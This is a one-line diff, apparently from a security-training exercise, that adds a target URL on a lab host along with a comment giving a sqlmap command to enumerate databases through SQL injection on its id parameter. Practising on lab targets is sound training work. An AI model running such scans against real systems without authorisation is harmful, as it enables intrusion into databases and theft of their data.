@@ -1,0 +1,1 @@
+http://active.hbtn/home?id=1 (GET)  # /usr/bin/sqlmap -u http://active.hbtn/home?id=1 --dbs --batch --random-agent --output-dir=./sqlmap_output
